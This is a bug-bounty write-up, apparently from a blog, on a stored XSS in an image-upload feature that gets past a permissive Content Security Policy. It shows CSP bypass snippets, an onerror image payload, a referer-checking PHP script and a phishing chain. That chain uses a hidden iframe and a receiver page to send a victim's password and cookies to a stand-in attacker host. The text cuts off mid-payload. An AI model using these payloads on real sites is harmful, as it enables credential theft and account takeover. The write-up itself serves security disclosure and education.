{"data":{"markdownRemark":{"html":"<p>This article is based on my findings during a bug bounty. I was looking for any input bugs which could trigger a XSS but didn't find any until I tested the file upload functionality. Users had the option to drag&#x26;drop images into the company's website and place it in their gallery, however by specifying an image like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>https://hackerdomain.hax/img.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>this.src=alert(1)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></code></pre></div>\n<p>And dropping it into the website trigged an XSS.</p>\n<p>Before I continue my report I will first cover what CSP is and what it tries to accomplish. If you feel you are already experienced in the area you can skip to the next section.</p>\n<h2 id=\"what-is-csp\"><a href=\"#what-is-csp\" aria-label=\"what is csp permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What is CSP?</h2>\n<p>Content Security Policy (CSP) is a client-side security model which allows developers to specify where different types of resources should be loaded, executed and embedded from. With CSP you can instruct the browser only to load javascript resources from a specific domain as well as block inline javascript running on the website. This is very helpful against XSS since most attacks requires inline javascript. There also the possibility to specify a <code class=\"language-text\">report-uri</code> which the browser uses to send detected policy violations <em>(of course this can be spoofed)</em>.</p>\n<p>However CSP is only effective if used fully, i.e blocking inline javascript and loading resources from trusted domains. This requirement can be too strict for some websites, that's why there are certain work arounds such as using nonces that whitelists specific <code class=\"language-text\">&lt;script&gt;&lt;/script&gt;</code> tags.</p>\n<p>It should be noted that even using <em>trusted</em> sources wont always protect you. If JSONP is enabled or e.g. angularjs is hosted on the whitelisted source, it is possible to bypass CSP with the following:</p>\n<h6 id=\"jsonp\"><a href=\"#jsonp\" aria-label=\"jsonp permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>JSONP</h6>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">&lt;script src=&quot;https://whitelisted.com/jsonp?callback=alert&quot;&gt;</code></pre></div>\n<h6 id=\"angularjs\"><a href=\"#angularjs\" aria-label=\"angularjs permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AngularJS</h6>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">&lt;script src=&quot;https://whitelisted.com/angularjs/1.1.3/angularjs.min.js&quot;&gt;\n&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1)&gt;</code></pre></div>\n<h2 id=\"weaknesses\"><a href=\"#weaknesses\" aria-label=\"weaknesses permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Weaknesses</h2>\n<p>As I mentioned earlier the company had employed CSP which is a good step in the right direction but because of its weak rules I could bypass it entirely and run whatever javascript I wanted once triggered.</p>\n<p>Below you can see a copy of the CSP:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">default-src &#39;self&#39; https://*.company.com https://*.companyimg.com  *.company.com *.companyimg.com *.google.com connect.facebook.net *.google-analytics.com https://*.googleapis.com *.gstatic.com https://*.facebook.com *.facebook.com www.googleadservices.com googleads.g.doubleclick.net platform.twitter.com *.tiles.mapbox.com *.online-metrix.net *.bnc.lt bnc.lt *.yozio.com &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;\n\nmedia-src &#39;self&#39; *.companyimg.com blob:;\n\nframe-src *;\n\nconnect-src &#39;self&#39; *.mapbox.com *.company.com company.s3.amazonaws.com ;\n\nimg-src * data:;</code></pre></div>\n<p>The <code class=\"language-text\">default-src</code> directive is set to only load resources from <em>self</em> and the other domains listed unless specified otherwise by other directives. If you haven't noticed it <code class=\"language-text\">unsafe-inline</code> and <code class=\"language-text\">unsafe-eval</code> is also present, which means running inline javascript is allowed <strong>by default</strong>.</p>\n<p>Other directives that are of interest is the <code class=\"language-text\">frame-src</code> and <code class=\"language-text\">img-src</code> because they allow resources to be loaded from anywhere. By exploiting <code class=\"language-text\">unsafe-inline</code> and <code class=\"language-text\">unsafe-eval</code> for running inline javascript, <code class=\"language-text\">frame-src</code> for sending data to the attacker's domain and <code class=\"language-text\">img-src</code> to trigger the initial XSS we can deliver a powerful payload.</p>\n<h2 id=\"the-attack\"><a href=\"#the-attack\" aria-label=\"the attack permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The attack</h2>\n<p>First we construct the image which the victim will drag&#x26;drop into their gallery:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>https://hackerdomain.hax/img.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>this.src=alert(1)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></code></pre></div>\n<p>This works because the CSP allows images to be loaded from anywhere. You may wonder why the JS is only triggered <code class=\"language-text\">onerror</code> and why the domain it set to <code class=\"language-text\">/img.php</code>.</p>\n<p>Once the victim has dropped the image into their gallery, the website will contact the hacker's domain to get a thumbnail image. The <code class=\"language-text\">img.php</code> script will detect the if the <code class=\"language-text\">HTTP_REFERER</code> is set to <em>company.com</em> which in that case will return a <em>404</em> causing the <code class=\"language-text\">onerror</code> attribute to execute.</p>\n<h5 id=\"imgphp\"><a href=\"#imgphp\" aria-label=\"imgphp permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>img.php</h5>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$ref</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'HTTP_REFERER'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$ref</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"nope\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'/.+company.com.+/'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ref</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$matches</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$matches</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"HTTP/1.0 404 Not Found\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token single-quoted-string string\">'hunter2.jpg'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$fp</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token single-quoted-string string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-Type: image/jpeg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-Length: \"</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">filesize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">fpassthru</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Now we can successfully run javascript in the victim's DOM, <em>what next?</em> My next step was to steal the user's cookies but the session cookie was set to <code class=\"language-text\">HttpOnly</code> which instructs the browser to not allow javascript to access the cookie. <strong>Bummer!</strong></p>\n<p>My next thought was to change the user's email address to my email and then preform a <em>Forgot password</em> which will send the password reset link to my email. However I noticed that once the email has been changed, the user will get a notification and the ability to lock the account. This could still be a viable attack vector depending on how long the user can wait until their ability to lock their account expires.</p>\n<h3 id=\"lets-go-phishing\"><a href=\"#lets-go-phishing\" aria-label=\"lets go phishing permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lets go phishing</h3>\n<p>Instead I chose to try to trick the user into enter their account password because they had been logged out. To accomplish this I needed to build a HTML Form, hide all other HTML elements and be able to send the data to my server.</p>\n<p>The communication part was the tricky part because the CSP only allows <code class=\"language-text\">XMLHttpRequest</code> to be used for specific domains. However after a bit of researching I found that I can communicate via iframes and to my luck iframes could be loaded from anywhere according to the CSP. Tunneling data via iframes can be visualised as followed:\n<br /><br />\n<a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c974368ec9f0a86052d8ed8bff615e10/cbec6/iframe_postmessage.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-wrapper\"\n    style=\"position: relative; display: block;  max-width: 690px; margin-left: auto; margin-right: auto;\"\n  >\n    <span\n      class=\"gatsby-resp-image-background-image\"\n      style=\"padding-bottom: 25.79710144927536%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsSAAALEgHS3X78AAABcUlEQVQY02OwXfPjgvXaX39t1v7+Zrn803fzhS+/my9+891iydvvVqt/fLVe9/ufzZqfV92WvBJgAALHlZ8ZPStnMjiXTkPBTiXTGNzKZzAwWK359ddi3d//luv//zdf9vG/yYzb/01n3f1vMvvhf8uVX/7bbPj332rtry9Ag1RABlq07GJiMEtgZDBNZ2QwS2NkME4F0kC2UQojg0UGI4PXpp9fQ3f8/h+w8/8/46nX/pmVzPvn3rzqn2/bmn/OdUv/mhbO/G/cd+Zd4KX/CgzEANt1v37brf/1337L/3/6ncf+a0ZV/7fM6vrvUTIJSHf/1Y2r/6/XuOOjcfMeC6ByEUYGBj7D1PZ6o8y+3UaZvesNM3o3AukNhhk924F4OoP1mp93LTf8/w/Efy3mP/mnX778v0Hlqv+6ZSv+61eu+mtQtfq/ad+ph5Y9J6SABnKCHKGb3H7EvGTuf+OcSf+Ncif/NwZik4IZ//XSul8CAMpXuTDHc/96AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n    ></span>\n    <img\n        class=\"gatsby-resp-image-image\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;box-shadow:inset 0px 0px 0px 400px white;\"\n        alt=\"iframe postmessage\"\n        title=\"\"\n        src=\"/static/c974368ec9f0a86052d8ed8bff615e10/cbec6/iframe_postmessage.png\"\n        srcset=\"/static/c974368ec9f0a86052d8ed8bff615e10/7995a/iframe_postmessage.png 213w,\n/static/c974368ec9f0a86052d8ed8bff615e10/b8496/iframe_postmessage.png 425w,\n/static/c974368ec9f0a86052d8ed8bff615e10/cbec6/iframe_postmessage.png 690w\"\n        sizes=\"(max-width: 690px) 100vw, 690px\"\n      />\n  </span>\n  </a>\n<br />\nThe injected iframe looks like the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>https://hackerdomain.com/recv.html<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>siteb<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>myframe<span class=\"token punctuation\">\"</span></span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"> <span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">=\"</span><span class=\"token attr-value\"><span class=\"token property\">display</span><span class=\"token punctuation\">:</span>none</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>Once the user enters their password and clicks submit, the following script will send the data to the iframe.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">></span>\n    form<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onsubmit</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n        pw<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mypw'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        c<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">;</span>\n        data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'cookie'</span><span class=\"token punctuation\">:</span>c<span class=\"token punctuation\">,</span><span class=\"token string\">'pw'</span><span class=\"token punctuation\">:</span>pw<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        fi<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'myframe'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fi<span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></code></pre></div>\n<p>Below you can find the code which receives the data.</p>\n<h5 id=\"hackerdomaincomrecvhtml\"><a href=\"#hackerdomaincomrecvhtml\" aria-label=\"hackerdomaincomrecvhtml permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>hackerdomain.com/recv.html</h5>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>message<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\nwindow<span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'message'</span><span class=\"token punctuation\">,</span> writeMessage<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">writeMessage</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> xmlHttp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    data <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    xmlHttp<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"https://hackerdomain/stl.php?c=\"</span><span class=\"token operator\">+</span>data<span class=\"token punctuation\">.</span>cookie<span class=\"token operator\">+</span><span class=\"token string\">\"&amp;pw=\"</span><span class=\"token operator\">+</span>data<span class=\"token punctuation\">.</span>pw<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false for synchronous request</span>\n    xmlHttp<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"message\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>Once the data has been sent to my domain, from there I can send it to my cookie stealer script and save the data. The final payload can be viewed below:</p>\n<h5 id=\"final-payload\"><a href=\"#final-payload\" aria-label=\"final payload permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Final Payload</h5>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>https://hackerdomain/img.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">onerror=\"this.src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>a</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementsByTagName(</span><span class=\"token attr-name\">'head')[0];f</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'iframe');f.src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>https://hackerdomain.com/recv.html<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;f.name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>siteb<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;f.id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>myframe<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\"><span class=\"token namespace\">;f.setAttribute('style','display:</span>none');b</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'script');div</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'div');div.</span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"><span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">='</span><span class=\"token attr-value\"><span class=\"token property\">width</span><span class=\"token punctuation\">:</span>660<span class=\"token punctuation\">;</span><span class=\"token property\">height</span><span class=\"token punctuation\">:</span>90%<span class=\"token punctuation\">;</span><span class=\"token property\">font</span><span class=\"token punctuation\">:</span>16px Arial<span class=\"token punctuation\">;</span><span class=\"token property\">padding</span><span class=\"token punctuation\">:</span>3em<span class=\"token punctuation\">;</span><span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span><span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>auto<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;form</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'form');form.action</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>#<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;inp</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'input');inp.type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>password<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;inp.id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>mypw<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;sub</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.createElement(</span><span class=\"token attr-name\">'input');sub.type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>submit<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;sub.id</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>subid<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;form.appendChild(inp);form.appendChild(sub);s</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>*<span 